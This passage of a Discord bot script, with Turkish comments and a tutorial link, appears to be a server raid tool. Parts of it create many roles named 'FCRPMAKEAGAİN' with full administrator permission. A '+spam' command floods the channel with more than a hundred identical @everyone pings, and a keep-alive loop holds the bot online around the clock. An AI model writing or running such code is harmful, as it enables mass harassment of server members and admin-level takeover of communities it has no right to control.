      name: "FCRPMAKEAGAİN",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    });
  }
});

client.on('message', msg => {
  if (msg.content === '+spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:');   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
        msg.channel.send('**__FCRP MAKE AGAİN__** @everyone :smiley:'); 
  }
});


const http = require("http");
const express = require("express");
const app = express();
    function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) { 
    if ((new Date().getTime() - start) > milliseconds){         //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
      break;
    }
  }    
}
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping tamamdır.");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);   //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
}, 3000);


//TÜM TELİF HAKKI ENES ACARA AİTTİR ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
